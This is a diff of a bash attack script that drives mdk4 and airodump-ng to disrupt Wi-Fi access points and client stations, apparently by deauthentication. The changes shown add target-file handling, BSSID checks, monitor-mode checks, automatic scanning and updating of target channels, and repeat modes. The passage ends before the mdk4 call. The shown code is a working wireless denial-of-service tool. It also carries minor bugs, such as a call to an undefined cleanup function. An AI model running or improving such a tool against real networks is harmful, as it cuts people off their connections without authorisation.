@@ -1,7 +1,7 @@
 #!/bin/bash
 
 show_help() {
-    echo "Usage: ${0} [-i INTERFACE] [-c CHAN] [-b BSSID] [-s STATION] [-t AP_BSSID_FILE] [-T STATION_BSSID_FILE] [-d DURATION] [-w WAIT] [-r REPEATS] [-p SPEED] [-h]"
+    echo "Usage: ${0} [-i INTERFACE] [-c CHAN] [-b BSSID] [-s STATION] [-B AP_BSSID_FILE] [-S STATION_BSSID_FILE] [-d DURATION] [-w WAIT] [-r REPEATS] [-p SPEED] [-h]"
     echo
     echo
     echo "Options:"
@@ -9,24 +9,34 @@ show_help() {
     echo "  -c CHAN         Specify the channel number (overrides when using a file)."
     echo "  -b BSSID        Specify the target BSSID (mandatory for single target)."
     echo "  -s STATION      Specify the target STATION BSSID (mandatory for single station)."
-    echo "  -t FILE         Specify the path to the file containing target BSSIDs and channels (one per line, format: BSSID,CHANNEL)."
-    echo "  -T FILE         Specify the path to the file containing target STATION BSSIDs and channels (one per line, format: BSSID,CHANNEL)."
+    echo "  -B FILE         Specify the path to the file containing target BSSIDs and channels (one per line, format: BSSID,CHANNEL)."
+    echo "  -S FILE         Specify the path to the file containing target STATION BSSIDs and channels (one per line, format: BSSID,CHANNEL)."
     echo "  -d DURATION     Specify the duration of mdk4 runtime in seconds (default: 25)."
     echo "  -w WAIT         Specify the delay between runs in seconds (default: 60)."
     echo "  -r REPEATS      Specify how many times the cycle should repeat (default: 3)."
-    echo "  -p SPEED        Specify the packets per second (default: unlimited)."
+    echo "  --ps SPEED      Specify the packets per second (default: unlimited)."
+    echo "  -u              Update -B BSSID Channels with Prompting."
+    echo "  --au            Update -B BSSID Channels without Pompting."
+    echo "  --st TIME       Specify channel update duration of --au."
+    echo "  --kf            Keep the temporary file made for -B or -S after use instead of deleting."
+    echo "  --am MODE       Specify Repeating Mode. 1 = Single Target, Full Repeats | 2 = All Targets, Full Repeats (default)."
     echo "  -h              Show this help menu."
     echo
     echo "Default Durations:"
     echo "  DURATION       $DEFAULT_DURATION seconds"
     echo "  WAIT           $DEFAULT_WAIT seconds"
     echo "  REPEATS        $DEFAULT_REPEATS times"
-    echo "  SPEED          $DEFAULT_PACKETS (unlimited)"
+    echo "  SPEED          $DEFAULT_PACKETS (0 = unlimited)"
+    echo "  MODE           $DEFAULT_ATTACK_MODE"
+    echo
+    echo "NOTE ON MODE:"
+    echo "  1 - Single Target, Full Repeats Per Target, In Order"
+    echo "  2 - All Targets, Full Repeats, In Order"
     echo
     echo "Target File Format for BSSID File:"
     echo
     echo "  BSSID,CHAN"
-    echo "  DE:AD:BE:EF:12:34,13"
+    echo "  00:11:22:33:44:55,13"
     echo
     echo "Target File Format for Station BSSID File (Most Effective):"
     echo
@@ -42,249 +52,896 @@ show_help() {
     echo "  ${0} -i wlan1mon -s 00:11:22:33:44:55 -c 10"
     echo
     echo "AP BSSID File, With Optional Defaults:"
-    echo "  ${0} -i wlan3mon -t targets.txt -d 20 -w 30 -r 5"
+    echo "  ${0} -i wlan3mon -B targets.txt -d 20 -w 30 -r 5"
     echo
     echo "AP BSSID File, Defaults Only:"
-    echo "  ${0} -i wlan1mon -t targets.txt"
+    echo "  ${0} -i wlan1mon -B targets.txt"
     echo
     echo "Station BSSID file, Defaults:"
-    echo "  ${0} -i wlan1mon -T stations.txt"
+    echo "  ${0} -i wlan1mon -S stations.txt"
     echo
     echo "Station BSSID file (Quick Sweep):"
-    echo "  ${0} -i wlan1mon -T stations.txt -d 11 -w 5 -r 1"
+    echo "  ${0} -i wlan1mon -S stations.txt -d 11 -w 5 -r 1"
     echo
 }
 
 cleanup() {
+    trap - EXIT SIGINT SIGTERM
+
     echo -e "\nCleaning up..."
     pkill -P $$  
+    keep_file_after
+    remove_temp_update
     wait
     echo "Cleanup complete. Exiting script."
     exit 0
 }
 
-trap cleanup SIGINT SIGTERM
+keep_file_after() {
+    if [ "${KEEP_FILE}" = false ]; then
+        if [ "${BSSID_FILE}" != "${ORIGIN_BSSID_FILE}" ]; then
+            rm "${BSSID_FILE}"
+        elif [ "${STATION_BSSID_FILE}" != "${ORIGIN_STA_FILE}" ]; then
+            rm "${STATION_BSSID_FILE}"
+        fi        
+    fi
+}
+
+remove_temp_update() {
+    rm "${UPDATE_FILE}"-* 2>/dev/null
+}
+
+validate_bssid() {
+    local bssid="$1"
+    # Check if BSSID is in the correct format, case-insensitive
+    if [[ ! "$bssid" =~ ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$ ]]; then
+        echo "[ERROR]: Invalid BSSID format: $bssid. BSSID should be in the format xx:xx:xx:xx:xx:xx with hex characters only." >&2
+        exit 1
+    fi
+}
+
+trap cleanup EXIT SIGINT SIGTERM
 
 DEFAULT_DURATION=30
-DEFAULT_WAIT=40
-DEFAULT_REPEATS=3
+DEFAULT_WAIT=30
+DEFAULT_REPEATS=1
 DEFAULT_PACKETS=0
+DEFAULT_ATTACK_MODE=2
+IS_24GHZ_SUPPORTED=false
+IS_5GHZ_SUPPORTED=false
+UPDATE_CH=false
+DEFAULT_FILTERUNASSOC=true
+DEFAULT_FILTERBYDATA=0
+DEFAULT_SCANTIME=30
+DEFAULT_WRITEINT=1
+UPDATE_FILE="/tmp/$(basename "${0}").temp"
+LOOP_START_DELAY=16
 
-while getopts ":i:c:b:s:t:T:d:w:r:p:h" opt; do
-    case $opt in
-        i) IFACE=$OPTARG ;;
-        c) CHAN=$OPTARG ;;
-        b) BSSID=$OPTARG ;;
-        s) STATION=$OPTARG ;;
-        t) BSSID_FILE=$OPTARG ;;
-        T) STATION_BSSID_FILE=$OPTARG ;;
-        d) DURATION_SECONDS=$OPTARG ;;
-        w) WAIT_SECONDS=$OPTARG ;;
-        r) REPEATS=$OPTARG ;;
-        p) PACKET_SPEED=$OPTARG ;;
-        h) show_help
-           exit 0 ;;
-        \?) echo "Invalid option: -$OPTARG" >&2
+CDATE=$(date "+%H-%M-%S")
+SCREENUID=$(openssl rand -hex 8)
+SKIPPED_AP_DELAY=5
+KEEP_FILE=false
+AUTO_UPDATE=false
+
+# Define valid channel ranges for 2.4GHz and 5GHz
+VALID_24GHZ_CHANNELS=(1 2 3 4 5 6 7 8 9 10 11 12 13 14)
+# If in the US add 177 to the list of valid 5GHz channels if your interface supports it
+VALID_5GHZ_CHANNELS=(36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 149 153 157 161 165 173)
+
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -i) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after -i"
+                exit 1
+            fi
+            INTERFACE="$2"
+            shift 2
+            ;;
+        -b) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after -b"
+                exit 1
+            fi
+            BSSID="$2"
+            validate_bssid "${BSSID}"
+            shift 2 
+            ;;
+        -c) 
+            if [[ -n "$2" && "$2" =~ ^[0-9]+$ ]]; then
+                CHAN="$2"
+                shift 2 
+            else
+                echo "[ERROR]: Invalid or missing channel after -c"
+                exit 1
+            fi
+            ;;
+        -B) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after -B"
+                exit 1
+            fi
+            BSSID_FILE="$2"
+            ORIGIN_BSSID_FILE="$2"
+            shift 2 
+            ;;
+        -s) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after -s"
+                exit 1
+            fi
+            STATION="$2"
+            validate_bssid "${STATION}"
+            shift 2 
+            ;;
+        -S) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after -S"
+                exit 1
+            fi
+            STATION_BSSID_FILE="$2"
+            ORIGIN_STA_FILE="$2"
+            shift 2 
+            ;;
+        -d) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after -d"
+                exit 1
+            fi
+            DURATION_SECONDS="$2"
+            shift 2 
+            ;;
+        -w) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after -w"
+                exit 1
+            fi
+            WAIT_SECONDS="$2"
+            shift 2 
+            ;;
+        -r) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after -r"
+                exit 1
+            fi
+            REPEATS="$2"
+            shift 2 
+            ;;
+        --ps) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after --ps"
+                exit 1
+            fi
+            PACKET_SPEED="$2"
+            shift 2 
+            ;;
+        -u) 
+            UPDATE_CH=true
+            shift 
+            ;;
+        --au)
+            AUTO_UPDATE=true
+            shift
+            ;;
+        --st)
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after --st"
+                exit 1
+            fi
+            SCANTIME="$2"
+            shift 2
+            ;;
+        --kf)
+            KEEP_FILE=true
+            shift
+            ;;
+        --am)
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument after --am"
+                exit 1
+            fi
+            ATTACK_MODE="$2"
+            shift 2
+            ;;
+        -h) 
             show_help
-            exit 1 ;;
-        :) echo "Option -$OPTARG requires an argument." >&2
-           show_help
-           exit 1 ;;
+            exit 0 
+            ;;
+        --help) 
+            show_help
+            exit 0 
+            ;;
+        --) 
+            shift
+            break # End of options
+            ;;
+        *) 
+            show_help
+            echo "[ERROR]: Invalid option: $1" >&2
+            exit 1 
+            ;;
     esac
+
+    # Exit the loop if no arguments are left to process
+    if [[ -z "$1" ]]; then
+        break
+    fi
 done
 
-if [ -z "$IFACE" ]; then
-    echo "[ERROR]: Interface is mandatory. Exiting." >&2
-    show_help
-    exit 1
-fi
-
-# Check if the BSSID file contains channels higher than 1-14 for wlan1mon
-if [ -n "$BSSID_FILE" ]; then
-    if [[ "$(awk -F"," '{print $2}' "$BSSID_FILE" | sort -nu | tail -n 1)" -gt 14 ]] && [[ "$IFACE" == "wlan1mon" ]]; then
-        echo "[ERROR]: You are attempting to start an attack with 5GHz channels on a 2.4GHz interface."
-        echo "[INFO]: Please remove the 5GHz channels from the file and try again."
-        exit 1
-    fi
-fi
-
-# Check if the STATION BSSID file contains channels higher than 1-14 for wlan1mon
-if [ -n "$STATION_BSSID_FILE" ]; then
-    if [[ "$(awk -F"," '{print $2}' "$STATION_BSSID_FILE" | sort -nu | tail -n 1)" -gt 14 ]] && [[ "$IFACE" == "wlan1mon" ]]; then
-        echo "[ERROR]: You are attempting to start an attack with 5GHz channels on a 2.4GHz interface."
-        echo "[INFO]: Please remove the 5GHz channels from the file and try again."
-        exit 1
-    fi
-fi
 
 DURATION_SECONDS=${DURATION_SECONDS:-$DEFAULT_DURATION}
 WAIT_SECONDS=${WAIT_SECONDS:-$DEFAULT_WAIT}
 REPEATS=${REPEATS:-$DEFAULT_REPEATS}
 PACKET_SPEED=${PACKET_SPEED:-$DEFAULT_PACKETS}
+SCANTIME=${SCANTIME:-$DEFAULT_SCANTIME}
+FILTERUNASSOC=${FILTERUNASSOC:-$DEFAULT_FILTERUNASSOC}
+WRITEINT=${WRITEINT:-$DEFAULT_WRITEINT}
+FILTERBYDATA=${FILTERBYDATA:-$DEFAULT_FILTERBYDATA}
+ATTACK_MODE=${ATTACK_MODE:-$DEFAULT_ATTACK_MODE}
 
+logic_checks() {
 
-if [ -n "$BSSID" ]; then
-    BSSIDS=("$BSSID")
-    if [ -z "$CHAN" ]; then
-        echo "[ERROR]: No channel specified. Please specify a channel using the -c option."
+    # 1. Check if the interface is provided
+    if [ -z "${INTERFACE}" ]; then
+        echo "[ERROR]: Interface is mandatory. Exiting." >&2
+        show_help
         exit 1
-    else
-        CHANNELS=("$CHAN")
     fi
-elif [ -n "$BSSID_FILE" ]; then
-    BSSIDS=($(awk -F"," '{print $1}' "$BSSID_FILE"))
-    if grep -q ",[0-9]" "$BSSID_FILE" && [ -n "$CHAN" ]; then
-        echo
-        echo "[WARNING]: Using -c will override your channels set. Make sure to verify your settings."
-        echo
-        # Check if the specified channel number is within the valid range for wlan1 or wlan1mon interface
-        if [[ ($IFACE == "wlan1" || $IFACE == "wlan1mon") && ($CHAN -gt 14 || $CHAN -lt 1) ]]; then
-            echo "[ERROR]: Channel number $CHAN is invalid for interface $IFACE. Please ensure channels are within the range 1-14 for 2.4GHz interfaces."
+
+    # 2. Check INTERFACE is valid and exists
+    if iwconfig "${INTERFACE}" 2>&1 | grep -q "No such device"; then
+        echo "[ERROR]: The interface '${INTERFACE}' is not valid or does not exist."
+        exit 1
+    fi
+
+    # 3. Check INTERFACE is in monitor mode
+    if ! iwconfig "${INTERFACE}" 2>&1 | grep -q "Mode:Monitor"; then
+        echo "[ERROR] '${INTERFACE}' must be in monitor mode."
+        exit 1
+    fi
+
+    # 4. If -B or -S are used, channels should be handled by the files
+    if { [ -n "${BSSID_FILE}" ] || [ -n "${STATION_BSSID_FILE}" ]; } && [ -n "${CHAN}" ]; then
+        echo "[ERROR]: -c option cannot be used with -B or -S. Channels should be in the BSSID or Station BSSID files, not on the command line."
+        exit 1
+    fi
+
+    # 5. If neither BSSID, BSSID_FILE, STATION, nor STATION_BSSID_FILE are provided, raise an error
+    if [ -z "${BSSID}" ] && [ -z "${BSSID_FILE}" ] && [ -z "${STATION}" ] && [ -z "${STATION_BSSID_FILE}" ]; then
+        echo "[ERROR]: You must specify at least one of the following: -b (BSSID), -B (AP BSSID file), -S (Station BSSID file), or -s (Single Station mode)."
+        show_help
+        exit 1
+    fi
+
+    # 6. Now check if -c is used and validate the channel
+    if [ -n "${CHAN}" ]; then
+        if [ -z "${CHAN}" ] && [ -z "${BSSID_FILE}" ] && [ -z "${STATION_BSSID_FILE}" ]; then
+            echo "[ERROR]: -c option requires a channel argument when neither -B nor -S is provided."
             exit 1
         fi
-        for ((i=0; i<${#BSSIDS[@]}; i++)); do
-            CHANNELS[$i]="$CHAN"
-        done
-    elif grep -q ",[0-9]" "$BSSID_FILE"; then
-        CHANNELS=($(awk -F"," '{print $2}' "$BSSID_FILE"))
-    elif [ -z "$CHAN" ]; then
-        echo
-        echo "[WARNING]: No channels specified in the file. Assuming a single channel for all BSSIDs. Please add channels or use -c."
-        read -e -p "Enter the channel number: " CHAN
     fi
-fi
 
-if [ -n "$STATION" ]; then
-    STATION_BSSIDS=("$STATION")
-    if [ -z "$CHAN" ]; then
-        echo "[ERROR]: No channel specified. Please specify a channel using the -c option."
+    # 7. If no channel argument is provided but -c is specified, show error
+    if [ -n "${CHAN}" ] && [ -z "${CHAN}" ]; then
+        echo "[ERROR]: -c requires a channel number to be specified."
+        show_help
         exit 1
-    else
-        STATION_CHANNELS=("$CHAN")
     fi
-elif [ -n "$STATION_BSSID_FILE" ]; then
-    STATION_BSSIDS=($(awk -F"," '{print $1}' "$STATION_BSSID_FILE"))
-    if grep -q ",[0-9]" "$STATION_BSSID_FILE" && [ -n "$CHAN" ]; then
-        echo
-        echo "[WARNING]: Using -c will override your channels set. Make sure to verify your settings."
-        echo
-        # Check if any channel number is within the valid range for wlan1 or wlan1mon interface
-        for channel in "${CHANNELS[@]}"; do
-            if [[ $channel -lt 1 || $channel -gt 14 || ($IFACE == "wlan1" || $IFACE == "wlan1mon") && $channel -gt 14 ]]; then
-                echo "[ERROR]: Channel number $channel is invalid for interface $IFACE. Please ensure channels are within the range 1-14 for 2.4GHz interfaces."
+
+    # 8. Check if -u (update channels) is used with invalid options
+    if [ "${UPDATE_CH}" = true ]; then
+        if [ -z "${BSSID_FILE}" ]; then
+            echo "[ERROR]: -u option can only be used with -B (BSSID_FILE)."
+            exit 1
+        fi
+    fi
+
+    # 9. Further validation for the BSSID/Station files
+    if [ -n "${BSSID_FILE}" ] || [ -n "${STATION_BSSID_FILE}" ]; then
+        # Ensure files are formatted correctly (BSSID,CHANNEL)
+        if [ -n "${BSSID_FILE}" ]; then
+            if ! awk -F"," '{print NF}' "${BSSID_FILE}" | grep -q "2"; then
+                echo "[ERROR]: BSSID file format is invalid. Ensure it is BSSID,CHANNEL."
                 exit 1
             fi
+        fi
+        if [ -n "${STATION_BSSID_FILE}" ]; then
+            if ! awk -F"," '{print NF}' "${STATION_BSSID_FILE}" | grep -q "2"; then
+                echo "[ERROR]: Station BSSID file format is invalid. Ensure it is BSSID,CHANNEL."
+                exit 1
+            fi
+        fi
+    fi
+
+    # 10. Handle file inputs if provided (BSSID_FILE or STATION_BSSID_FILE) and assign channels
+    if [ -n "${BSSID_FILE}" ]; then
+        BSSIDS=($(awk -F"," '{print $1}' "${BSSID_FILE}"))
+        CHANNELS=($(awk -F"," '{print $2}' "${BSSID_FILE}"))
+    fi
+    if [ -n "${STATION_BSSID_FILE}" ]; then
+        STATION_BSSIDS=($(awk -F"," '{print $1}' "${STATION_BSSID_FILE}"))
+        STATION_CHANNELS=($(awk -F"," '{print $2}' "${STATION_BSSID_FILE}"))
+    fi
+}
+
+# Call function
+logic_checks
+
+remove_temp_update() {
+    rm "${UPDATE_FILE}"-* 2>/dev/null
+}
+
+update_ch_check() {
+
+    # Check if auto is selected
+    if [ "${AUTO_UPDATE}" = true ]; then
+        echo "Automatic Update Options Config"
+        SCANTIME=${SCANTIME:-$DEFAULT_SCANTIME}
+        FILTERUNASSOC=${FILTERUNASSOC:-$DEFAULT_FILTERUNASSOC}
+        WRITEINT=${WRITEINT:-$DEFAULT_WRITEINT}
+        FILTERBYDATA=${FILTERBYDATA:-$DEFAULT_FILTERBYDATA}
+        updatechannels
+    else
+
+        # Check if update is selected
+        if [ "${UPDATE_CH}" = true ]; then
+            echo "Update flag detected."
+            read -e -p "Enter value for SCANTIME (default: ${DEFAULT_SCANTIME}s): " SCANTIME
+            SCANTIME=${SCANTIME:-$DEFAULT_SCANTIME}
+
+            read -e -p "Enter value for FILTERBYDATA (default: ${DEFAULT_FILTERBYDATA}): " FILTERBYDATA
+            FILTERBYDATA=${FILTERBYDATA:-$DEFAULT_FILTERBYDATA}
+
+            read -e -p "Enter value for WRITEINT (default: ${DEFAULT_WRITEINT}s): " WRITEINT
+            WRITEINT=${WRITEINT:-$DEFAULT_WRITEINT}
+
+            read -e -p "Enter value for FILTERUNASSOC (default: ${DEFAULT_FILTERUNASSOC}): " FILTERUNASSOC
+            FILTERUNASSOC=${FILTERUNASSOC:-$DEFAULT_FILTERUNASSOC}
+
+            updatechannels "${SCANTIME}" "${FILTERBYDATA}" "${WRITEINT}" "${FILTERUNASSOC}"
+        fi
+    fi
+}
+
+updatechannels() {
+    if [ "${AUTO_UPDATE}" = true ]; then
+        detect_supported_bands
+        echo "Automatic Band Config and Channel Update."
+        if [ "${IS_24GHZ_SUPPORTED}" == true ] && [ "${IS_5GHZ_SUPPORTED}" == true ]; then
+            BAND="agb"
+        elif [ "${IS_24GHZ_SUPPORTED}" == true ] && [ "${IS_5GHZ_SUPPORTED}" == false ]; then
+            BAND="gb"
+        elif [ "${IS_5GHZ_SUPPORTED}" == true ] && [ "${IS_24GHZ_SUPPORTED}" == false ]; then
+            BAND="a"
+        else
+            echo "[ERROR]: No supported bands for selected interface."
+            exit 1
+        fi
+
+        # Run airodump-ng based on the detected or user-selected band
+        if [ "${FILTERUNASSOC}" == true ]; then
+                screen -dmS "ch_update_${SCREENUID}" airodump-ng --band "${BAND}" --output-format csv --write-interval "${WRITEINT}" -n "${FILTERBYDATA}" -w "${UPDATE_FILE}" -a "${INTERFACE}" &
+                echo "Gathering channels for ${SCANTIME}s. Please wait."
+                sleep "${SCANTIME}"
+                screen -S "ch_update_${SCREENUID}" -X quit
+        else
+                screen -dmS "ch_update_${SCREENUID}" airodump-ng --band "${BAND}" --output-format csv --write-interval "${WRITEINT}" -n "${FILTERBYDATA}" -w "${UPDATE_FILE}" "${INTERFACE}" &
+                echo "Gathering channels for ${SCANTIME}s. Please wait."
+                sleep "${SCANTIME}"
+                screen -S "ch_update_${SCREENUID}" -X quit
+        fi
+
+     else
+            # Perform a cleanup of temp_output just in case
+            remove_update_temp
+
+            echo "Updating input files channels. Please Wait.."
+            echo "SCANTIME VALUE:      ${SCANTIME}s"
+            echo "FILTERBYDATA VALUE:  ${FILTERBYDATA}"
+            echo "WRITEINT VALUE:      ${WRITEINT}s"
+            echo "FILTERUNASSOC VALUE: ${FILTERUNASSOC}"
+            echo "INTERFACE: ${INTERFACE}"
+
+            # Detect supported bands dynamically using the interface
+            detect_supported_bands
+
+            # Ask user for band selection if both are supported
+            if [ "${IS_24GHZ_SUPPORTED}" == true ] && [ "${IS_5GHZ_SUPPORTED}" == true ]; then
+                echo "Both 2.4GHz and 5GHz supported. Please select a band:"
+                echo "1. 2.4GHz"
+                echo "2. 5GHz"
+                echo "3. Both"
+                read -p "Enter your choice (1/2/3): " BAND_CHOICE
+
+                case "$BAND_CHOICE" in
+                    1)
+                        BAND="gb"
+                        echo "You selected 2.4GHz, scanning 2.4GHz."
+                        ;;
+                    2)
+                        BAND="a"
+                        echo "You selected 5GHz, scanning 5GHz."
+                        ;;
+                    3)
+                        BAND="agb"
+                        echo "You selected both 2.4GHz and 5GHz, scanning both bands."
+                        ;;
+                    *)
+                        echo "Invalid choice, defaulting to both bands."
+                        BAND="agb"
+                        ;;
+                esac
+        elif [ "${IS_24GHZ_SUPPORTED}" == true ]; then
+                BAND="gb"
+                echo "Only 2.4GHz supported, scanning 2.4GHz."
+        elif [ "${IS_5GHZ_SUPPORTED}" == true ]; then
+                BAND="a"
+                echo "Only 5GHz supported, scanning 5GHz."
+        else
+                echo "Error: No supported bands detected for the selected interface."
+                exit 1
+        fi
+
+        # Run airodump-ng based on the detected or user-selected band
+        if [ "${FILTERUNASSOC}" == true ]; then
+                screen -dmS "ch_update_${SCREENUID}" airodump-ng --band "${BAND}" --output-format csv --write-interval "${WRITEINT}" -n "${FILTERBYDATA}" -w "${UPDATE_FILE}" -a "${INTERFACE}" &
+                echo "Gathering channels for ${SCANTIME}s. Please wait."
+                sleep "${SCANTIME}"
+                screen -S "ch_update${SCREENUID}" -X quit
+        else
+                screen -dmS "ch_update_${SCREENUID}" airodump-ng --band "${BAND}" --output-format csv --write-interval "${WRITEINT}" -n "${FILTERBYDATA}" -w "${UPDATE_FILE}" "${INTERFACE}" &
+                echo "Gathering channels for ${SCANTIME}s. Please wait."
+                sleep "${SCANTIME}"
+                screen -S "ch_update_${SCREENUID}" -X quit
+        fi
+    fi
+    # Initiate file channel processing
+    process_channels
+}
+
+process_channels() {
+    # Extract and update channel numbers
+    while IFS=',' read -r bssid old_channel; do
+        # Extract new channel number from temp_output
+        new_channel=$(grep "${bssid}" "${UPDATE_FILE}"-01.csv | head -n 1 | cut -d ',' -f 4)
+
+        # Update channel number in input file
+        awk -F',' -v OFS=',' -v bssid="${bssid}" -v new_channel="${new_channel}" 'BEGIN { OFS = "," } $1 == bssid { gsub(/^[[:space:]]+|[[:space:]]+$/, "", $2); gsub(/^[[:space:]]+|[[:space:]]+$/, "", new_channel); if ($2 != new_channel) $2 = new_channel; print } $1 != bssid' "$BSSID_FILE" > temp && mv temp "$BSSID_FILE"
+    done < "${BSSID_FILE}"
+
+    echo "All BSSIDs channels within a detectable range have been updated."
+    echo "Please check your input file and run the script again."
+    if [ "${AUTO_UPDATE}" = true ]; then
+        AUTO_UPDATE=false
+        return 0
+    else
+        exit 1
+    fi
+}
+
+detect_supported_bands() {
+    # Get the PHY index for the interface using iw dev
+    PHY=$(iw dev | awk -v iface="${INTERFACE}" '$1 ~ /^phy#/ { phy=$1 } $1 == "Interface" && $2 == iface { print phy; exit }' | tr -d '#')
+    if [ -z "${PHY}" ]; then
+        echo "[ERROR]: Unable to find phy index for interface ${INTERFACE}. Exiting."
+        exit 1
+    fi
+
+    # Fetch the Frequencies block for the PHY interface and extract channels
+    SUPPORTED_CHANNELS=$(iw phy "${PHY}" info | awk '/Frequencies:/,/^$/' | grep -oE '\[[0-9]+\]' | tr -d '[]')
+
+    # Check if any supported channels match valid 2.4GHz channels
+    for channel in ${SUPPORTED_CHANNELS}; do
+        if [[ " ${VALID_24GHZ_CHANNELS[@]} " =~ " ${channel} " ]]; then
+            IS_24GHZ_SUPPORTED=true
+            break
+        fi
+    done
+
+    # Check if any supported channels match valid 5GHz channels
+    for channel in ${SUPPORTED_CHANNELS}; do
+        if [[ " ${VALID_5GHZ_CHANNELS[@]} " =~ " ${channel} " ]]; then
+            IS_5GHZ_SUPPORTED=true
+            break
+        fi
+    done
+
+    # Default to false if no matches
+    IS_24GHZ_SUPPORTED=${IS_24GHZ_SUPPORTED:-false}
+    IS_5GHZ_SUPPORTED=${IS_5GHZ_SUPPORTED:-false}
+
+    # Debug output
+#    echo "2.4GHz Supported: ${IS_24GHZ_SUPPORTED}"
+#    echo "5GHz Supported: ${IS_5GHZ_SUPPORTED}"
+}
+
+validate_bssid() {
+    local bssid="$1"
+    # Check if BSSID is in the correct format, case-insensitive
+    if [[ ! "$bssid" =~ ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$ ]]; then
+        echo "[ERROR]: Invalid BSSID format: $bssid. BSSID should be in the format xx:xx:xx:xx:xx:xx with hex characters only." >&2
+        exit 1
+    fi
+}
+
+# Check freq now
+detect_supported_bands
+
+# Update flag check
+update_ch_check
+
+validate_channel_range() {
+    # Validate BSSID_FILE
+    if [[ -n "$BSSID_FILE" ]]; then
+        OUTPUT_FILE="${BSSID_FILE}.${CDATE}"
+        > "$OUTPUT_FILE"  # Initialize/clear the file
+        declare -a SKIPPED_APS
+
+        mapfile -t AP_ENTRIES < <(awk -F"," '{print $1 "," $2}' "$BSSID_FILE" | uniq)
+
+        for entry in "${AP_ENTRIES[@]}"; do
+            IFS=',' read -r ap_bssid channel <<< "$entry"
+
+            if [[ -z "$channel" || ! "$channel" =~ ^[0-9]+$ ]]; then
+                SKIPPED_APS+=("$ap_bssid - Channel invalid or empty")
+                continue
+            fi
+
+            if [[ "$channel" -le 14 ]]; then
+                if [[ "$IS_24GHZ_SUPPORTED" = false ]]; then
+                    SKIPPED_APS+=("$ap_bssid - 2.4GHz not supported")
+                    continue
+                elif [[ ! " ${VALID_24GHZ_CHANNELS[@]} " =~ " $channel " ]]; then
+                    SKIPPED_APS+=("$ap_bssid - Invalid 2.4GHz channel $channel")
+                    continue
+                fi
+            elif [[ "$channel" -ge 36 ]]; then
+                if [[ "$IS_5GHZ_SUPPORTED" = false ]]; then
+                    SKIPPED_APS+=("$ap_bssid - 5GHz not supported")
+                    continue
+                elif [[ ! " ${VALID_5GHZ_CHANNELS[@]} " =~ " $channel " ]]; then
+                    SKIPPED_APS+=("$ap_bssid - Invalid 5GHz channel $channel")
+                    continue
+                fi
+            else
+                SKIPPED_APS+=("$ap_bssid - Unknown band or invalid channel $channel")
+                continue
+            fi
+
+            echo "$ap_bssid,$channel" >> "$OUTPUT_FILE"
         done
-        for ((i=0; i<${#STATION_BSSIDS[@]}; i++)); do
-            STATION_CHANNELS[$i]="$CHAN"
+
+        if [[ ${#SKIPPED_APS[@]} -gt 0 ]]; then
+            echo -e "\n[SUMMARY]: Skipped APs:"
+            for skipped in "${SKIPPED_APS[@]}"; do
+                echo "  $skipped"
+            done
+            echo "Continuing in ${SKIPPED_AP_DELAY} seconds..."
+            sleep "${SKIPPED_AP_DELAY}"
+        fi
+
+        echo "Validation complete. Results saved to ${OUTPUT_FILE}."
+        BSSID_FILE="$OUTPUT_FILE"
+    fi
+
+    # Validate STATION_FILE
+    if [[ -n "$STATION_BSSID_FILE" ]]; then
+        OUTPUT_FILE="${STATION_BSSID_FILE}.${CDATE}"
+        > "$OUTPUT_FILE"  # Initialize/clear the file
+        declare -a SKIPPED_STATIONS
+
+        mapfile -t STATION_ENTRIES < <(awk -F"," '{print $1 "," $2}' "$STATION_BSSID_FILE" | uniq)
+
+        for entry in "${STATION_ENTRIES[@]}"; do
+            IFS=',' read -r station_bssid channel <<< "$entry"
+
+            if [[ -z "$channel" || ! "$channel" =~ ^[0-9]+$ ]]; then
+                SKIPPED_STATIONS+=("$station_bssid - Channel invalid or empty")
+                continue
+            fi
+
+            if [[ "$channel" -le 14 ]]; then
+                if [[ "$IS_24GHZ_SUPPORTED" = false ]]; then
+                    SKIPPED_STATIONS+=("$station_bssid - 2.4GHz not supported")
+                    continue
+                elif [[ ! " ${VALID_24GHZ_CHANNELS[@]} " =~ " $channel " ]]; then
+                    SKIPPED_STATIONS+=("$station_bssid - Invalid 2.4GHz channel $channel")
+                    continue
+                fi
+            elif [[ "$channel" -ge 36 ]]; then
+                if [[ "$IS_5GHZ_SUPPORTED" = false ]]; then
+                    SKIPPED_STATIONS+=("$station_bssid - 5GHz not supported")
+                    continue
+                elif [[ ! " ${VALID_5GHZ_CHANNELS[@]} " =~ " $channel " ]]; then
+                    SKIPPED_STATIONS+=("$station_bssid - Invalid 5GHz channel $channel")
+                    continue
+                fi
+            else
+                SKIPPED_STATIONS+=("$station_bssid - Unknown band or invalid channel $channel")
+                continue
+            fi
+
+            echo "$station_bssid,$channel" >> "$OUTPUT_FILE"
         done
-    elif grep -q ",[0-9]" "$STATION_BSSID_FILE"; then
-        STATION_CHANNELS=($(awk -F"," '{print $2}' "$STATION_BSSID_FILE"))
-    elif [ -z "$CHAN" ]; then
-        echo
-        echo "[WARNING]: No channels specified in the file. Assuming a single channel for all STATION BSSIDs. Please add channels or use -c."
-        read -e -p "Enter the channel number: " CHAN
+
+        if [[ ${#SKIPPED_STATIONS[@]} -gt 0 ]]; then
+            echo -e "\n[SUMMARY]: Skipped Stations:"
+            for skipped in "${SKIPPED_STATIONS[@]}"; do
+                echo "  $skipped"
+            done
+            echo "Continuing in ${SKIPPED_AP_DELAY} seconds..."
+            sleep "${SKIPPED_AP_DELAY}"
+        fi
+
+        echo "Validation complete. Results saved to ${OUTPUT_FILE}."
+        STATION_BSSID_FILE="$OUTPUT_FILE"
+    fi
+}
+
+bssid_file_channel_check() {
+    # Check if BSSID file is provided
